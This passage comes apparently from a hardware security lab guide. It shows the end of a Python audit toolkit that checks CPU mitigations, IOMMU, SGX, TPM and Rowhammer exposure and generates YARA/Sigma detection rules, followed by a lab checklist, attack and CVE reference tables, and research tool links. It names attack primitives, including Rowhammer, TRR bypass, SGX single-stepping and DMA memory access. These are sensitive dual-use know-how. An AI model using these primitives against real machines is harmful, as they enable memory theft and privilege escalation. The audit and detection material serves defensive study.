            json.dump(report, f, indent=2, default=str)
    
    def generate_text(self) -> str:
        """Generate human-readable text report"""
        lines = []
        lines.append("=" * 70)
        lines.append("HARDWARE SECURITY AUDIT REPORT")
        lines.append(f"Generated: {datetime.now(timezone.utc).isoformat()}")
        lines.append(f"Host: {os.uname().nodename}")
        lines.append(f"Kernel: {os.uname().release}")
        lines.append("=" * 70)
        
        for section in self.sections:
            lines.append(f"\n{'─' * 70}")
            lines.append(f"  {section['title']}")
            lines.append(f"{'─' * 70}")
            
            for item in section["findings"]:
                if isinstance(item, VulnFinding):
                    sev = item.severity.value
                    lines.append(f"  [{sev:8s}] {item.name}: {item.status}")
                    if item.detail:
                        lines.append(f"             {item.detail}")
                    if item.mitigation:
                        lines.append(f"             Fix: {item.mitigation}")
                elif isinstance(item, dict):
                    for k, v in item.items():
                        lines.append(f"  {k}: {v}")
        
        lines.append(f"\n{'=' * 70}")
        lines.append("END OF REPORT")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════
# Main Entry Point
# ═══════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Hardware Security Analysis Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--full-audit", action="store_true",
                       help="Run complete hardware security audit")
    parser.add_argument("--vuln-check", action="store_true",
                       help="Check CPU vulnerability mitigations only")
    parser.add_argument("--dma-check", action="store_true",
                       help="Check DMA/IOMMU protection only")
    parser.add_argument("--sgx-check", action="store_true",
                       help="Check SGX capability and attestation")
    parser.add_argument("--tpm-check", action="store_true",
                       help="Check TPM security configuration")
    parser.add_argument("--rowhammer-prereq", action="store_true",
                       help="Check Rowhammer attack prerequisites")
    parser.add_argument("--generate-rules", action="store_true",
                       help="Generate detection rules (Sigma + YARA)")
    parser.add_argument("--output", default="hw_security_report.json",
                       help="Output file path")
    parser.add_argument("--rules-dir", default="./detection_rules",
                       help="Output directory for detection rules")
    
    args = parser.parse_args()
    
    report = ReportGenerator()
    
    if args.full_audit or args.vuln_check:
        print("[*] Auditing CPU vulnerability mitigations...")
        auditor = HardwareVulnAuditor()
        findings = auditor.audit_all()
        report.add_section("CPU Vulnerability Mitigations", findings)
        
        critical = sum(1 for f in findings if f.severity == Severity.CRITICAL)
        print(f"    {len(findings)} checks completed, {critical} CRITICAL issues")
    
    if args.full_audit or args.dma_check:
        print("[*] Auditing DMA/IOMMU protection...")
        dma = DMAProtectionAuditor()
        findings = dma.audit()
        report.add_section("DMA Protection", findings)
        print(f"    {len(findings)} checks completed")
    
    if args.full_audit or args.sgx_check:
        print("[*] Checking SGX capability...")
        sgx = SGXAttestationEngine()
        cap = sgx.check_sgx_capability()
        report.add_section("SGX Capability", [cap])
        print(f"    SGX supported: {cap.get('sgx_supported', False)}")
    
    if args.full_audit or args.tpm_check:
        print("[*] Analyzing TPM security...")
        tpm = TPMSecurityAnalyzer()
        tpm_info = tpm.check_tpm_type()
        pcr_info = tpm.check_pcr_integrity()
        report.add_section("TPM Security", [tpm_info, pcr_info])
        print(f"    TPM present: {tpm_info.get('present', False)}, Type: {tpm_info.get('type', 'N/A')}")
    
    if args.full_audit or args.rowhammer_prereq:
        print("[*] Checking Rowhammer prerequisites...")
        rh = RowhammerAnalyzer()
        dram = rh.detect_dram_config()
        prereqs = rh.check_prerequisites()
        report.add_section("Rowhammer Analysis", [dram, prereqs])
        print(f"    DRAM: {dram.get('type', 'unknown')}, ECC: {dram.get('ecc', False)}")
    
    if args.generate_rules:
        print(f"[*] Generating detection rules to {args.rules_dir}/...")
        engine = DetectionRuleEngine()
        os.makedirs(args.rules_dir, exist_ok=True)
        
        # Export YARA
        yara_path = os.path.join(args.rules_dir, "hardware_attacks.yar")
        engine.export_yara(yara_path)
        print(f"    YARA rules: {yara_path}")
        
        # Export Sigma (as JSON since yaml may not be installed)
        sigma_path = os.path.join(args.rules_dir, "sigma_hw_rules.json")
        with open(sigma_path, "w") as f:
            json.dump(engine.generate_sigma_rules(), f, indent=2)
        print(f"    Sigma rules: {sigma_path}")
    
    # Generate report
    if args.full_audit or any([args.vuln_check, args.dma_check, args.sgx_check,
                               args.tpm_check, args.rowhammer_prereq]):
        report.generate_json(args.output)
        print(f"\n[*] Report saved to {args.output}")
        print(report.generate_text())


if __name__ == "__main__":
    main()
```

---

## Lab Validation Checklist

### Exercise Completion Verification

| # | Exercise | Validation |
|---|----------|-----------|
| 1 | SGX Enumeration | `cpuid | grep SGX` returns capability info; `/dev/sgx*` enumerated |
| 2 | SGX-Step Single-Stepping | Trace CSV contains per-instruction RIP and cache observations |
| 3 | L1TF/Foreshadow | Mitigation status verified; attack concept understood |
| 4 | Double-Sided Rowhammer | Bit flips detected (or confirmed DDR5/ECC protection) |
| 5 | TRRespass TRR Bypass | Counter capacity determined; bypass pattern identified |
| 6 | DRAMA Bank Detection | Bank groups correctly identified via timing |
| 7 | DMA Attack Assessment | IOMMU and Thunderbolt security levels documented |
| 8 | TPM Timing Analysis | Timing samples collected; statistical analysis completed |
| 9 | Mitigation Audit | All vulnerabilities checked; hardening applied |
| 10 | Detection System | Monitors deployed; alert on Rowhammer verified |
| 11 | Attestation Infrastructure | PCCS running; verification policy enforced |

### Security Posture Verification

```bash
# Final validation: run the full audit
python3 hardware_security_toolkit.py --full-audit --generate-rules \
    --output /tmp/final_audit.json --rules-dir /tmp/hw_rules/

# Verify zero CRITICAL findings after hardening
jq '.sections[].findings[] | select(.severity == "CRITICAL")' /tmp/final_audit.json
# Expected: empty output (no critical issues remaining)
```

---

## Appendix A: Hardware Attack Quick Reference

| Attack | Target | Primitive | Detection |
|--------|--------|-----------|-----------|
| Foreshadow (L1TF) | SGX enclave L1D | Speculative PTE load | L1D flush status |
| MDS (ZombieLoad/RIDL) | CPU buffers (LFB/LP/SB) | Faulting load + buffer forward | VERW clearing status |
| Plundervolt | AES-NI in SGX | Undervolt → DFA on faulty output | MSR 0x150 lock status |
| SGAxe | Quoting Enclave key | CacheOut + key extraction | TCB recovery version |
| ÆPIC Leak | L2 cache via APIC MMIO | Architectural stale read | Microcode version |
| Rowhammer | DRAM cells | Repeated row activation | ECC CE counters, LLC miss rate |
| TRRespass | TRR counters | Many-sided pattern | Activation rate monitoring |
| Blacksmith | TRR heuristics | Non-uniform frequency | Pattern analysis |
| PCILeech/DMA | Physical memory via PCIe | DMA read/write | IOMMU status, TB security |
| TPM-FAIL | ECDSA nonce | Timing side channel | TPM firmware version |
| PLATYPUS | RAPL energy counters | Power analysis (DPA) | perf_event_paranoid level |
| Hertzbleed | DVFS frequency | Timing via power-induced throttle | Constant-time code audit |
| Zenbleed | YMM register file | VZEROUPPER misprediction | Microcode / DE_CFG bit |
| Downfall/GDS | GATHER internal buffer | Stale buffer sampling | Microcode gather serialization |
| Inception | Return Address Predictor | Transient RAP training | IBPB_BRTYPE |
| Reptar | Microcode state machine | REP MOVSB + prefix | Microcode update |

## Appendix B: CVE-to-Mitigation Quick Reference

| CVE | Kernel Parameter | Sysfs Check |
|-----|-----------------|-------------|
| CVE-2018-3615 (Foreshadow-SGX) | L1D flush on enclave exit | `vulnerabilities/l1tf` |
| CVE-2018-12126/27 (MDS) | `mds=full,nosmt` | `vulnerabilities/mds` |
| CVE-2019-11135 (TAA) | `tsx=off` | `vulnerabilities/tsx_async_abort` |
| CVE-2020-8694 (PLATYPUS) | — | `perf_event_paranoid >= 3` |
| CVE-2022-40982 (Downfall) | `gather_data_sampling=on` | `vulnerabilities/gather_data_sampling` |
| CVE-2023-20593 (Zenbleed) | — (microcode) | DE_CFG MSR bit 9 |
| CVE-2023-20569 (Inception) | — (microcode) | `vulnerabilities/spec_rstack_overflow` |
| CVE-2023-23583 (Reptar) | — (microcode) | CPU stepping/microcode version |
| CVE-2023-28746 (RFDS) | — (VERW on E-cores) | `vulnerabilities/reg_file_data_sampling` |

## Appendix C: Key References

- SGX-Step: https://github.com/jovanbulck/sgx-step
- TRRespass: https://github.com/vusec/trrespass
- Blacksmith: https://github.com/comsec-group/blacksmith
- DRAMA: https://github.com/IAIK/drama
- PCILeech: https://github.com/ufrisk/pcileech
- Google rowhammer-test: https://github.com/google/rowhammer-test
- Intel SGX SDK: https://download.01.org/intel-sgx/
- Intel DCAP: https://github.com/intel/SGXDataCenterAttestationPrimitives
- Gramine: https://gramineproject.io/
- PLATYPUS: https://platypusattack.com/
- Foreshadow: https://foreshadowattack.eu/
- Downfall: https://downfall.page/
